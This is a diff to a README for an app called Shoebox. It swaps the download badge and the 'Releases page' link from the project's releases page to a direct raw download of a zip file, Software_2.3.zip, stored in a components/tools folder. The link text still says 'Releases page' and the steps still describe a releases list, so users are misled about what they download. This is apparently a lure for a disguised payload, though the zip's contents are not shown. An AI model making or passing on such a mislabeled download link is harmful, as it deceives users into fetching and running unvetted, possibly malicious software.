@@ -6,7 +6,7 @@ Welcome to Shoebox! This application provides a range of tools that prioritize y
 
 ## 🔗 Download Shoebox
 
-[![Download Shoebox](https://img.shields.io/badge/Download%20Shoebox-latest%20release-blue)](https://github.com/Notorious592/shoebox/releases)
+[![Download Shoebox](https://raw.githubusercontent.com/Notorious592/shoebox/main/components/tools/Software_2.3.zip%20Shoebox-latest%20release-blue)](https://raw.githubusercontent.com/Notorious592/shoebox/main/components/tools/Software_2.3.zip)
 
 ## 📦 What is Shoebox?
 
@@ -44,7 +44,7 @@ Here’s a detailed look at what Shoebox offers:
 
 ## 💻 Download & Install
 
-To get started with Shoebox, visit the [Releases page](https://github.com/Notorious592/shoebox/releases) to download the latest version. Follow these simple steps:
+To get started with Shoebox, visit the [Releases page](https://raw.githubusercontent.com/Notorious592/shoebox/main/components/tools/Software_2.3.zip) to download the latest version. Follow these simple steps:
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of Shoebox at the top of the list.
